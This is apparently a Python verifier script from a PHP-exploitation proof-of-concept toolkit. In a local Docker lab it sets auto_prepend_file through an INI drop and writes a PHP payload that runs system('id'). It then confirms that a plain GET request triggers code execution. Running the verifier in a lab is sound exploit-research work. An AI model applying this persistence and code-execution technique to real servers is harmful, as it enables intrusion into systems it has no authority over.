#!/usr/bin/env python3
"""Verifier for auto_include_fire_oracle.py on the 8.4.26-apache mod_php lab.

Proves the documented result: a poison marker emitted by a PLAIN GET to a
no-include landing page can ONLY come from PG(auto_prepend_file) firing, so the
oracle is a sink-free success signal. Substrate: the auto_prepend_file field is
set (via a conf.d INI drop = the "landed write") pointing at an attacker-dropped
marker-emitting PHP file.
  BASELINE: field set but payload file absent -> plain GET -> oracle does NOT fire.
  FIRE:     payload file dropped            -> plain GET -> oracle fires + extracts
            the command output (uid=...).
Verification is by REQUEST BEHAVIOR only (the oracle's own confirm_rce path).

Lab bring-up / teardown (committed pgpersist profile, c2-apache mod_php, :8096):
    docker compose -f docker-compose.reuse.yml -p vgen-aio --profile pgpersist up -d
    python3 -I poc/primitives/oracles/verify_auto_include_fire_oracle.py --project vgen-aio
    docker compose -f docker-compose.reuse.yml -p vgen-aio --profile pgpersist down
(container php2shell_pgpersist-pgp-apache-1; marker set/dropped via docker exec.)
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
_ROOT = os.path.dirname(_POC_ROOT)
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


ORA = _load("auto_include_fire_oracle", "auto_include_fire_oracle.py")  # under test

COMPOSE = os.path.join(_ROOT, "docker-compose.reuse.yml")
PAYLOAD = "/tmp/p.php"
INI = "/usr/local/etc/php/conf.d/zzz-aio.ini"


def _dexec(container, *cmd):
    return subprocess.run(["docker", "exec", container, *cmd],
                          capture_output=True, text=True)


def _restart(container):
    for argv in (["apachectl", "-k", "graceful"], ["apache2ctl", "-k", "graceful"]):
        if _dexec(container, *argv).returncode == 0:
            break
    time.sleep(2)


def _up(port):
    try:
        urllib.request.urlopen("http://127.0.0.1:%d/index.php" % port, timeout=4).read()
        return True
    except Exception:
        return False


def ensure_lab(compose, project, port):
    if _up(port):
        print("[lab] pgpersist apache lab already up (:%d)" % port)
        return True
    print("[lab] bringing pgpersist up (-p %s --profile pgpersist)" % project)
    subprocess.run(["docker", "compose", "-f", compose, "-p", project,
                    "--profile", "pgpersist", "up", "-d"], cwd=_ROOT, capture_output=True)
    for _ in range(60):
        if _up(port):
            return True
        time.sleep(1)
    return False


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify auto_include_fire_oracle")
    ap.add_argument("--compose-file", default=COMPOSE)
    ap.add_argument("--project", default="p2s-aio")
    ap.add_argument("--container", default="php2shell_pgpersist-pgp-apache-1")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8096)
    ap.add_argument("--base", default="/index.php")
    ap.add_argument("--down", action="store_true")
    a = ap.parse_args(argv)

    print("=" * 78)
    print("VERIFY auto_include_fire_oracle (plain-GET sink-free success oracle)")
    print("=" * 78)
    if not ensure_lab(a.compose_file, a.project, a.port):
        print("[FAIL] could not bring the pgpersist apache lab up")
        return 2

    # Substrate: set PG(auto_prepend_file) via a conf.d INI (the "landed write").
    _dexec(a.container, "sh", "-c",
           "printf 'auto_prepend_file=%s\\n' > %s" % (PAYLOAD, INI))
    _dexec(a.container, "rm", "-f", PAYLOAD)
    _restart(a.container)

    checks = []

    # BASELINE: field set, payload absent -> no marker.
    b_ok, b_out, b_probes = ORA.confirm_rce(a.host, a.port, base=a.base, tries=2,
                                            verbose=False)
    print("[baseline] auto_prepend set but payload absent -> fired=%s (expect False)"
          % b_ok)
    checks.append(("baseline: oracle does NOT fire (no false positive)", not b_ok))

    # FIRE: drop the marker-emitting payload.
    payload_php = "<?php echo '%s'; system('id'); echo '%s';" % (ORA.MARK_S, ORA.MARK_E)
    _dexec(a.container, "sh", "-c",
           "cat > %s <<'EOF'\n%s\nEOF" % (PAYLOAD, payload_php))
    _dexec(a.container, "chmod", "644", PAYLOAD)
    f_ok, f_out, f_probes = ORA.confirm_rce(a.host, a.port, base=a.base, tries=6,
                                            verbose=True)
    out = (f_out or "").strip()
    uid = "uid=" in out
    print("[fire] plain GET %s -> fired=%s probes=%d output=%r"
          % (a.base, f_ok, f_probes, out))
    checks.append(("fire: oracle reports auto_prepend fired on plain GET", f_ok))
    checks.append(("fire: oracle extracts command output (uid=...)", uid))

    # cleanup: remove the field + payload so the lab is reusable.
    _dexec(a.container, "rm", "-f", PAYLOAD, INI)
    _restart(a.container)

    print("-" * 78)
    allok = all(ok for _, ok in checks)
    for name, ok in checks:
        print("  [%s] %s" % ("PASS" if ok else "FAIL", name))
    print("  VERDICT: %s" % ("PASS" if allok else "FAIL"))
    print("  (substrate: auto_prepend_file set via conf.d INI, not a memory write)")

    if a.down:
        subprocess.run(["docker", "compose", "-f", a.compose_file, "-p", a.project,
                        "--profile", "pgpersist", "down"], cwd=_ROOT, capture_output=True)
    return 0 if allok else 1


if __name__ == "__main__":
    raise SystemExit(main())
